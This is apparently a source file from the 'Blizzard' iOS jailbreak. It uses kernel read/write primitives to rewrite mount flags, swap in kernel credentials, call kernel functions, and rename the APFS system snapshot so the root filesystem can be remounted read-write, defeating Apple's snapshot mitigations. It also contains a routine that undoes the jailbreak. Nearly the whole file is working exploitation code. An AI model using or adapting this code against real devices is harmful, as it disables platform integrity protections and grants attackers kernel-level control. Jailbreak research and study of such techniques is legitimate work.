// Thanks to the Electra Team and Pwn20wnd!
/* APFS snapshot mitigation bypass bug by CoolStar, exploitation by Pwn20wnd */
/* Disables the new APFS snapshot mitigations introduced in iOS 11.3 */

#include <stdio.h>
#import <sys/snapshot.h>
#include <sys/stat.h>
#include <sys/mount.h>
#include <CoreFoundation/CoreFoundation.h>
#include "rootfs_remount.h"
#include "snapshot_tools.h"
#include <spawn.h>
#include "../sock_port/kernel_memory.h"
#include "../sock_port/exploit.h"
#include "../Kernel Utilities/kernel_utils.h"
#include "../PatchFinder/patchfinder64.h"
#include "../Kernel Utilities/kexecute.h"
#include "../sock_port/offsetof.h"
#include "../Kernel Utilities/system_reboot.h"
#include "../Blizzard Jailbreak/BlizzardLog.h"
#include "../Blizzard Jailbreak/blizzardJailbreak.h"
#include "../APFS Utilities/snapshot_tools.h"
#define ROOTFSTESTFILE "/.BlizzardJB"
#define ROOTFSMNT "/var/rootfsmnt"
#define APPLESNAP "com.apple.os.update-"
#include "../Kernel Utilities/kernSymbolication.h"

uint64_t offset_vfs_context_current;
uint64_t offset_vnode_lookup;
uint64_t offset_vnode_put;
char *diskLocation = "/dev/disk0s1s1";
int shouldReboot = 0;
void dumpContentsOfDir(char *path);

// From http://newosxbook.com/src.jl?tree=&file=/xnu-1504.15.3/bsd/hfs/hfs_mount.h
struct hfs_mount_args {
    char       *fspec;                                       /* block special device to mount */
    uid_t      hfs_uid;                                      /* uid that owns hfs files (standard HFS only) */
    gid_t      hfs_gid;                                      /* gid that owns hfs files (standard HFS only) */
    mode_t     hfs_mask;                                     /* mask to be applied for hfs perms  (standard HFS only) */
    u_int32_t  hfs_encoding;                                 /* encoding for this volume (standard HFS only) */
    struct     timezone hfs_timezone;                        /* user time zone info (standard HFS only) */
    int        flags;                                        /* mounting flags, see below */
    int        journal_tbuffer_size;                         /* size in bytes of the journal transaction buffer */
    int        journal_flags;                                /* flags to pass to journal_open/create */
    int        journal_disable;                              /* don't use journaling (potentially dangerous) */
};

int file_exists(const char *filename) {
    int r = access(filename, F_OK);
    return (r == 0);
}

static uint64_t _vnode_lookup = 0;
static uint64_t _vnode_put = 0;
static uint64_t _vfs_context_current = 0;

int vnode_lookup(const char *path, int flags, uint64_t *vnode, uint64_t vfs_context) {
    
    size_t len = strlen(path) + 1;
    uint64_t ptr = kalloc(8);
    uint64_t ptr2 = kalloc(len);
    kwrite(ptr2, path, len);
    
    _vnode_lookup = find_symbol("_vnode_lookup", false);
    if (!_vnode_lookup) _vnode_lookup = Find_vnode_lookup();
    else _vnode_lookup += kernel_slide;
    
    if (kexecute(_vnode_lookup, ptr2, flags, ptr, vfs_context, 0, 0, 0)) {
        return -1;
    }
    *vnode = rk64(ptr);
    kfree(ptr2, len);
    kfree(ptr, 8);
    return 0;
}

uint64_t get_vfs_context() {
    _vfs_context_current = find_symbol("_vfs_context_current", false);
    if (!_vfs_context_current) _vfs_context_current = Find_vfs_context_current();
    else _vfs_context_current += kernel_slide;
    return ZmFixAddr(kexecute(_vfs_context_current, 1, 0, 0, 0, 0, 0, 0));
}

int vnode_put(uint64_t vnode) {
    _vnode_put = find_symbol("_vnode_put", false);
    if (!_vnode_put) _vnode_put = Find_vnode_put();
    else _vnode_put += kernel_slide;
    return (int)kexecute(_vnode_put, vnode, 0, 0, 0, 0, 0, 0);
}

int mountDevAtPathAsRW(const char* devpath, const char* path) {
    struct hfs_mount_args mntargs;
    bzero(&mntargs, sizeof(struct hfs_mount_args));
    mntargs.fspec = (char*)devpath;
    mntargs.hfs_mask = 1;
    gettimeofday(NULL, &mntargs.hfs_timezone);
    int rvtmp = mount("apfs", path, 0, (void *)&mntargs);
    perror("mount");
    return rvtmp;
}

uint64_t getVnodeAtPath(const char *path) {
    uint64_t *vnode_ptr = (uint64_t *)malloc(8);
    if (vnode_lookup(path, 0, vnode_ptr, get_vfs_context())) {
        printf("ROOT FS REMOUNT: Unable to get vnode from path for %s\n", path);
        free(vnode_ptr);
        return -1;
    }
    else {
        uint64_t vnode = *vnode_ptr;
        free(vnode_ptr);
        printf("GOT VNODE: 0x%llx\n", vnode);
        return vnode;
    }
}

BOOL remount1126() {
    uint64_t rootfs_vnode = getVnodeAtPath("/");
    printf("\nROOT FS REMOUNT: vnode of /: 0x%llx\n", rootfs_vnode);
    uint64_t v_mount = rk64(rootfs_vnode + off_v_mount);
    uint32_t v_flag = rk32(v_mount + off_mnt_flag);
    printf("ROOT FS REMOUNT: Clearing FS Flags\n");
    printf("ROOT FS REMOUNT: Flags before 0x%x\n", v_flag);
    v_flag &= ~MNT_NOSUID;
    v_flag &= ~MNT_RDONLY;
    v_flag &= ~MNT_ROOTFS;
    
    printf("ROOT FS REMOUNT: Flags after 0x%x\n", v_flag);
    wk32(v_mount + off_mnt_flag, v_flag);
    
    char *nmz = strdup("/dev/disk0s1s1");
    int rv = mount("apfs", "/", MNT_UPDATE, (void *)&nmz);
    free(nmz);
    printf("ROOT FS REMOUNT: Remounting /, return value = %d\n", rv);
    v_mount = rk64(rootfs_vnode + off_v_mount);
    wk32(v_mount + off_mnt_flag, v_flag);
    
    int fd = open("/RWTEST", O_RDONLY);
    if (fd == -1) {
        fd = creat("/RWTEST", 0777);
    } else {
        printf("ROOT FS REMOUNT: File already exists! Good!\n");
    }
    close(fd);
    printf("ROOT FS REMOUNT STATUS: %s\n", [[NSFileManager defaultManager] fileExistsAtPath:@"/RWTEST"] ? "Successful!" : "FAILED!");
    return [[NSFileManager defaultManager] fileExistsAtPath:@"/RWTEST"] ? YES : NO;
}

int remountRootFS() {
    int rv = -1, ret = -1;
    if (kCFCoreFoundationVersionNumber > 1451.51 && list_snapshots("/")) {
        printf("****** DOING THE HARD REMOUNT ******\n");
        shouldReboot = 1;
        uint64_t devVnode = getVnodeAtPath("/dev/disk0s1s1");
        if (devVnode == 0 || devVnode == -1){
            printf("FAIL!\n");
            return -1;
        }
        uint64_t specinfo = rk64(devVnode + off_v_specinfo);
        wk32(specinfo + off_specflags, 0);
        if ([[NSFileManager defaultManager] fileExistsAtPath:@"/var/rootfsmnt"])
            rmdir("/var/rootfsmnt");
        
        mkdir("/var/rootfsmnt", 0777);
        chown("/var/rootfsmnt", 0, 0);
        printf("ROOT FS REMOUNT: Temporarily setting kernel credentials\n");
        uint64_t creds = copyPIDCredentials(getpid(), 0);
        if (mountDevAtPathAsRW("/dev/disk0s1s1", "/var/rootfsmnt")) {
            printf("ROOT FS REMOUNT: Error mounting root at %s\n", "/var/rootfsmnt");
        }
        else {
            printf("ROOT FS REMOUNT: Disabling the APFS snapshot mitigations\n");
            char *snap = find_system_snapshot();
            if (snap && !do_rename("/var/rootfsmnt", snap, "orig-fs")) {
                rv = 0;
                unmount("/var/rootfsmnt", 0);
                rmdir("/var/rootfsmnt");
            }
        }
        printf("ROOT FS REMOUNT: Restoring our credentials\n");
        uint64_t proc_smp = proc_of_pid(getpid());
        wk64(proc_smp + off_p_ucred, creds);
        vnode_put(devVnode);
        if (rv) {
            printf("ROOT FS REMOUNT: Failed to disable the APFS snapshot mitigations\n");
        }
        else {
            printf("ROOT FS REMOUNT: Disabled the APFS snapshot mitigations\n");
            ret = 0;
        }
    }
    else {
        shouldReboot = 0;
        ret = 0;
        remount1126();
    }
    return ret;
}

extern char* const* environ;
int spawnBinaryWithArgs(NSURL *launchPath,NSArray *arguments) {
    NSMutableArray *posixSpawnArguments=[arguments mutableCopy];
    [posixSpawnArguments insertObject:[launchPath lastPathComponent] atIndex:0];
    int argc=(int)posixSpawnArguments.count+1;
    printf("Number of posix_spawn arguments: %d\n",argc);
    char **args=(char**)calloc(argc,sizeof(char *));
    for (int i=0; i<posixSpawnArguments.count; i++)
        args[i]=(char *)[posixSpawnArguments[i]UTF8String];
    
    printf("File exists at launch path: %d\n",[[NSFileManager defaultManager]fileExistsAtPath:launchPath.path]);
    printf("Executing %s: %s\n",launchPath.path.UTF8String,arguments.description.UTF8String);
    posix_spawn_file_actions_t action;
    posix_spawn_file_actions_init(&action);
    pid_t pid;
    int status;
    status = posix_spawn(&pid, launchPath.path.UTF8String, &action, NULL, args, environ);
    if (status == 0) {
        if (waitpid(pid, &status, 0) != -1) {
            
        }
    }
    posix_spawn_file_actions_destroy(&action);
    free(args);
    return status;
}

int checkifFileExistsAndWait(const char *filename) {
    int rv = 0;
    rv = access(filename, F_OK);
    for (int i = 0; !(i >= 100 || rv == 0); i++) {
        usleep(100000);
        rv = access(filename, F_OK);
    }
    return rv;
}

const char *systemSnapshot(char *bootHash) {
    if (!bootHash) {
        return NULL;
    }
    return [[NSString stringWithFormat:@APPLESNAP @"%s", bootHash] UTF8String];
}

int unjailbreakBlizzard(){
    printf("Blizzard Unjailbreak: Temporarily setting kernel credentials\n");
    uint64_t creds = copyPIDCredentials(getpid(), 0);
    if (kCFCoreFoundationVersionNumber < 1452.23) {
        int retval = fs_snapshot_rename(open("/", O_RDONLY, 0), "orig-fs", systemSnapshot(copyBootHash()), 0);
        if (access("/var/MobileSoftwareUpdate/mnt1", F_OK)) {
            int retv = mkdir("/var/MobileSoftwareUpdate/mnt1", 0755);
            if (retv != 0){
                printf("Blizzard Unjailbreak: Failed to unjailbreak. Cannot access /var/MobileSoftwareUpdate/mnt1\n");
                printf("Blizzard Unjailbreak: Restoring our credentials\n");
                uint64_t proc_smp = proc_of_pid(getpid());
                wk64(proc_smp + off_p_ucred, creds);
                return -1;
            }
        }
        if (retval == 0){
            printf("Blizzard Unjailbreak: Successfully restored the default APFS Snapshot!\n");
            if (snapshot_check("/", "orig-fs") == 1) {
                retval = spawnBinaryWithArgs([NSURL fileURLWithPath:@"/sbin/mount_apfs"], @[@"-s", @"orig-fs", @"/", @"/var/MobileSoftwareUpdate/mnt1"]);
            } else {
                retval = spawnBinaryWithArgs([NSURL fileURLWithPath:@"/sbin/mount_apfs"], @[@"-s", [NSString stringWithFormat:@"%s", systemSnapshot(copyBootHash())], @"/", @"/var/MobileSoftwareUpdate/mnt1"]);
            }
            
            retval = checkifFileExistsAndWait("/var/MobileSoftwareUpdate/mnt1/sbin/launchd");
            if (retval == 0){
                retval = spawnBinaryWithArgs([NSURL fileURLWithPath:@"/usr/bin/rsync"], @[@"-vaxcH", @"--progress", @"--delete-after", @"/var/MobileSoftwareUpdate/mnt1/.", @"/"]);
                if (retval == 0){
                    printf("Blizzard Unjailbreak: Restoring our credentials\n");
                    uint64_t proc_smp = proc_of_pid(getpid());
                    wk64(proc_smp + off_p_ucred, creds);
                    return 0;
                }
            }
        }
    } else {
        int retvalue = fs_snapshot_rename(open("/", O_RDONLY, 0), "orig-fs", systemSnapshot(copyBootHash()), 0);
        if (retvalue == 0){
            printf("Blizzard Unjailbreak: Restoring our credentials\n");
            uint64_t proc_smp = proc_of_pid(getpid());
            wk64(proc_smp + off_p_ucred, creds);
            return 0;
        }
    }
    return 0;
}
